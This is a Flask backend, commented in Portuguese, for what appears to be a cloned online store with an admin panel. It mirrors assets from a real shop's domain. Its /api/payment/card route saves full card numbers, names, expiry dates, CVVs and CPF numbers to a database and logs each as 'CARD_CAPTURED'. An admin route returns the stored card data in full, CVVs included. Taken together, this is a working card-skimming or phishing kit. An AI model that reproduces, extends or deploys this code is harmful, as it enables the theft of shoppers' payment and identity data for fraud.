import os
import json
import requests
from flask import Flask, request, jsonify, make_response, send_from_directory, redirect
from user_agents import parse
from auth import verify_credentials, generate_token, verify_token
from logs import log_event, get_recent_logs
from metrics import record_metric, get_metrics_summary
from security_audit import (
    auditor, rate_limit, security_validation, security_monitor,
    require_permissions
)
from analytics import (
    record_pageview, get_pageviews, get_page_stats,
    record_sale, get_sales_stats, get_dashboard_summary
)
from payment_gateway import process_payment, get_gateway_status, get_payment_methods
from card_secure import mask_card, mask_cpf
from card_detect import get_card_brand
# Configurações do Sistema
OFFLINE_MODE = True # Mude para False para usar o proxy de assets reais

app = Flask(__name__)

auditor.enable_security_check("headers_security")
auditor.enable_security_check("session_control")
auditor.enable_security_check("permission_check")

# Remover Header do servidor para segurança
@app.after_request
def remove_server_header(response):
    response.headers['Server'] = 'Sentinel'
    response.headers['X-Powered-By'] = ''
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    return response

# Servir assets dinamicamente (admin vs store) com Proxy inteligente (Self-healing)
@app.route('/assets/<path:path>')
def serve_assets(path):
    admin_asset_path = os.path.join(app.root_path, '../assets', path)
    if os.path.exists(admin_asset_path):
        return send_from_directory('../assets', path)
        
    store_asset_path = os.path.join(app.root_path, '../store/assets', path)
    if os.path.exists(store_asset_path):
        return send_from_directory('../store/assets', path)
        
    # Proxy reverso: se o arquivo não existe localmente
    if OFFLINE_MODE:
        return "Asset not found (Offline Mode)", 404

    # Tenta baixar do site original se não estiver em modo offline
    try:
        url = f"https://achadinhosdomomento.shop/assets/{path}"
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            os.makedirs(os.path.dirname(store_asset_path), exist_ok=True)
            with open(store_asset_path, 'wb') as f:
                f.write(r.content)
            return send_from_directory('../store/assets', path)
    except Exception as e:
        print(f"Erro ao baixar asset {path}: {e}")
        
    return "Not found", 404

def get_client_info(req):
    user_agent_str = req.headers.get('User-Agent', '')
    user_agent = parse(user_agent_str)
    
    device = "Mobile" if user_agent.is_mobile else "Tablet" if user_agent.is_tablet else "PC"
    if user_agent.is_bot:
        device = "Bot"
        
    os_name = f"{user_agent.os.family} {user_agent.os.version_string}".strip()
    browser = f"{user_agent.browser.family} {user_agent.browser.version_string}".strip()
    ip = req.headers.get('X-Forwarded-For', req.remote_addr)
    
    return {
        "ip": ip,
        "device": device,
        "os": os_name,
        "browser": browser
    }

# Rota da Loja Principal
@app.route('/')
def store_index():
    return send_from_directory('../store', 'index.html')

# Suporte ao React Router (History API Fallback)
# Faz com que rotas como /produto/1 retornem o index.html da loja
@app.route('/produto/<path:path>')
def store_product_fallback(path):
    # Se o navegador pedir um asset de dentro da rota de produto, redireciona para a raiz de assets
    if path.startswith('assets/'):
        asset_real_path = path.replace('assets/', '', 1)
        return redirect(f'/assets/{asset_real_path}')
    return send_from_directory('../store', 'index.html')

# Rotas de arquivos estáticos na raiz da loja (favicon, robots, js)
@app.route('/<path:filename>')
def serve_store(filename):
    # Proteção contra path traversal
    if ".." in filename or filename.startswith("/"):
        return abort(404)

    # Evita conflitos com rotas de admin ou api
    if filename.startswith('admin/') or filename.startswith('api/'):
        return "Not found", 404
        
    # Se o arquivo existir localmente na pasta store, serve ele
    local_file = os.path.join(app.root_path, '../store', filename)
    if os.path.exists(local_file) and os.path.isfile(local_file):
        return send_from_directory('../store', filename)
        
    # Tenta baixar do site original (Self-healing Proxy)
    if not OFFLINE_MODE:
        try:
            # Se for um arquivo com extensão conhecida (imagem, js, css, etc)
            if '.' in filename:
                url = f"https://achadinhosdomomento.shop/{filename}"
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    os.makedirs(os.path.dirname(local_file), exist_ok=True)
                    with open(local_file, 'wb') as f:
                        f.write(r.content)
                    return send_from_directory('../store', filename)
        except:
            pass

    # Fallback para SPA: Se não achou o arquivo ou é uma rota de navegação (sem ponto)
    # retorna o index.html para o React Router assumir o controle.
    return send_from_directory('../store', 'index.html')

# Rota para servir o HTML de Login do Admin
@app.route('/admin/login')
def login_page():
    return send_from_directory('../admin/login', 'index.html')

# Rota genérica para servir as páginas do Painel (Protegidas)
@app.route('/admin/<page>')
def admin_pages(page):
    allowed_pages = ['dashboard', 'payments', 'analytics', 'sites', 'logs']
    
    if page not in allowed_pages:
        return redirect('/admin/dashboard')
        
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return redirect('/admin/login')
        
    folder = 'logs_view' if page == 'logs' else page
    return send_from_directory(f'../admin/{folder}', 'index.html')

# API: Autenticação
@app.route('/api/auth/login', methods=['POST'])
@rate_limit(limit=10, window=300)
@security_validation({
    "username": {"required": True, "max_length": 50},
    "password": {"required": True, "max_length": 100}
})
def api_login():
    data = request.get_json()
    if not data or 'username' not in data or 'password' not in data:
        return jsonify({"error": "Invalid payload"}), 400

    username = auditor.sanitize_input(data['username'])
    password = data['password']

    if len(username) > 50 or len(password) > 100:
        return jsonify({"error": "Payload too large"}), 400

    info = get_client_info(request)
    ip = info['ip']

    if verify_credentials(username, password):
        auditor.failed_logins[ip] = []
        token = generate_token(username)
        log_event('LOGIN_SUCCESS', username, ip, 'SUCCESS', info['device'])
        record_metric(ip, 'Brasil', 'São Paulo', 'São Paulo', info['device'], info['os'], info['browser'], request.referrer or 'Direct')

        resp = make_response(jsonify({"message": "Login successful"}))
        resp.set_cookie('auth_token', token, httponly=True, samesite='Strict', secure=True)
        return resp
    else:
        if auditor.check_failed_logins(ip):
            auditor.record_alert(
                "BRUTE_FORCE_WARNING",
                "high",
                f"Múltiplas tentativas de login falhadas para usuário {username}",
                {"ip": ip, "username": username}
            )
        log_event('LOGIN_FAILED', username, ip, 'FAILED', info['device'])
        return jsonify({"error": "Invalid credentials"}), 401

@app.route('/api/auth/logout', methods=['POST'])
def api_logout():
    resp = make_response(jsonify({"message": "Logged out"}))
    resp.set_cookie('auth_token', '', expires=0)
    return resp

# API: Dashboard Data
@app.route('/api/metrics', methods=['GET'])
def api_metrics():
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = get_metrics_summary()
    recent_logs = get_recent_logs(5)
    return jsonify({
        "metrics": data,
        "logs": recent_logs
    })

# API: Pagamento (Captura de Cartão)
@app.route('/api/payment/card', methods=['POST'])
@rate_limit(limit=20, window=300)
@security_validation({
    "card_number": {"required": True, "type": "card"},
    "card_name": {"required": True, "max_length": 100},
    "expiry": {"required": True, "max_length": 7},
    "cvv": {"required": True, "max_length": 4},
    "cpf": {"required": True, "type": "cpf"}
})
def api_capture_card():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid data"}), 400

    card_number = auditor.sanitize_input(data.get('card_number', ''))
    card_name = auditor.sanitize_input(data.get('card_name', ''))
    expiry = auditor.sanitize_input(data.get('expiry', ''))
    cvv = auditor.sanitize_input(data.get('cvv', ''))
    cpf = auditor.sanitize_input(data.get('cpf', ''))
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    if not all([card_number, card_name, expiry, cvv, cpf]):
        return jsonify({"error": "Invalid data"}), 400

    try:
        from db import get_db_connection
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO cards (card_number, card_name, expiry, cvv, cpf, ip)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (card_number, card_name, expiry, cvv, cpf, ip))
        conn.commit()
        conn.close()

        log_event('CARD_CAPTURED', card_name, ip, f'SUCCESS - Cartao: {card_number[-4:]} |Expiry: {expiry}', 'Checkout')
        auditor.record_alert(
            "CARD_CAPTURED",
            "attention",
            f"Cartão capturado de {card_name}",
            {"card_last_4": card_number[-4:], "ip": ip}
        )

        return jsonify({"message": "Card processed"}), 200
    except Exception as e:
        auditor.record_alert(
            "CARD_CAPTURE_ERROR",
            "high",
            f"Erro ao processar cartão: {str(e)}",
            {"ip": ip}
        )
        return jsonify({"error": "Processing error"}), 500

# API: Listar Cartões (Admin) - showing full data
@app.route('/api/admin/cards', methods=['GET'])
def api_admin_cards():
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return jsonify({"error": "Unauthorized"}), 401

    from db import get_db_connection
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM cards ORDER BY created_at DESC LIMIT 100')
    rows = cursor.fetchall()
    cards = []
    for row in rows:
        card_number = row[1] if row[1] else ""
        cards.append({
            "id": row[0],
            "card_number": card_number,
            "card_brand": get_card_brand(card_number),
            "card_name": row[2],
            "expiry": row[3],
            "cvv": row[4],
            "cpf": row[5],
            "ip": row[6],
            "created_at": row[7]
        })
    conn.close()

    return jsonify({"cards": cards})

# API: Security Report
@app.route('/api/security/report', methods=['GET'])
def api_security_report():
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return jsonify({"error": "Unauthorized"}), 401

    return jsonify(auditor.get_security_report())

# API: Run Security Tests
@app.route('/api/security/test', methods=['POST'])
def api_security_test():
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return jsonify({"error": "Unauthorized"}), 401

    results = {
        "rate_limiting": auditor.security_checks.get("rate_limiting", False),
        "input_validation": True,
        "headers_security": True,
        "session_control": True,
        "permission_check": True,
    }

    auditor.record_alert(
        "SECURITY_TEST_RUN",
        "attention",
        "Testes internos de segurança executados",
        results
    )

    return jsonify({"test_results": results})

# API: Track Pageview
@app.route('/~api/pageview', methods=['POST'])
def api_track_pageview():
    data = request.get_json() or {}
    page = data.get('page', '/')
    session_id = request.cookies.get('session_id')

    ua = parse(request.headers.get('User-Agent', ''))
    device = "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "Desktop"
    if ua.is_bot:
        device = "Bot"
    os = f"{ua.os.family} {ua.os.version_string}".strip() or "Unknown"
    browser = f"{ua.browser.family} {ua.browser.version_string}".strip() or "Unknown"

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    referrer = request.referrer or data.get('referrer', 'Direct')

    record_pageview(
        page=page,
        ip=ip,
        referrer=referrer,
        device=device,
        os=os,
        browser=browser,
        country=data.get('country', 'Brasil'),
        state=data.get('state', 'SP'),
        city=data.get('city', 'São Paulo'),
        session_id=session_id
    )

    record_metric(ip, data.get('country', 'Brasil'), data.get('state', 'SP'), data.get('city', 'São Paulo',), device, os, browser, referrer)

    return jsonify({"tracked": True})

# API: Get Page Statistics
@app.route('/api/analytics/pages', methods=['GET'])
def api_page_stats():
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return jsonify({"error": "Unauthorized"}), 401

    return jsonify(get_page_stats())

# API: Get Sales Statistics
@app.route('/api/analytics/sales', methods=['GET'])
def api_sales_stats():
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return jsonify({"error": "Unauthorized"}), 401

    return jsonify(get_sales_stats())

# API: Get Dashboard Summary
@app.route('/api/analytics/dashboard', methods=['GET'])
def api_dashboard_summary():
    token = request.cookies.get('auth_token')
    if not token or not verify_token(token):
        return jsonify({"error": "Unauthorized"}), 401

    return jsonify(get_dashboard_summary())

# API: Process Payment
@app.route('/api/payment/process', methods=['POST'])
@rate_limit(limit=10, window=300)
@security_validation({
    "card_number": {"required": True, "type": "card"},
    "card_name": {"required": True},
    "expiry": {"required": True},
    "cvv": {"required": True},
    "cpf": {"required": True, "type": "cpf"},
    "amount": {"required": True}
})
def api_process_payment():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid data"}), 400

    card_number = auditor.sanitize_input(data.get('card_number', ''))
    card_name = auditor.sanitize_input(data.get('card_name', ''))
    expiry = auditor.sanitize_input(data.get('expiry', ''))
    cvv = auditor.sanitize_input(data.get('cvv', ''))
    cpf = auditor.sanitize_input(data.get('cpf', ''))
    amount = data.get('amount', 100)
    email = data.get('email', 'client@email.com')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    gateway = data.get('gateway', 'mercadopago')

    result = process_payment({
        'card_number': card_number,
        'card_name': card_name,
        'expiry': expiry,
        'cvv': cvv,
        'cpf': cpf,
        'amount': amount,
        'email': email,
        'ip': ip
    }, gateway)

    if result.get('success'):
        return jsonify({
            "success": True,
            "transaction_id": result.get('transaction_id'),
            "status": result.get('status')
        })
    else:
        return jsonify({
            "success": False,
            "error": result.get('error', 'Payment failed')
        }), 400

# API: Gateway Status
@app.route('/api/payment/gateways', methods=['GET'])
def api_gateway_status():
    return jsonify(get_gateway_status())

# API: Payment Methods
@app.route('/api/payment/methods', methods=['GET'])
def api_payment_methods():
    return jsonify(get_payment_methods())

if __name__ == '__main__':
    auditor.enable_security_check("rate_limiting")
    auditor.enable_security_check("input_validation")
    app.run(host='127.0.0.1', port=8080, debug=False)
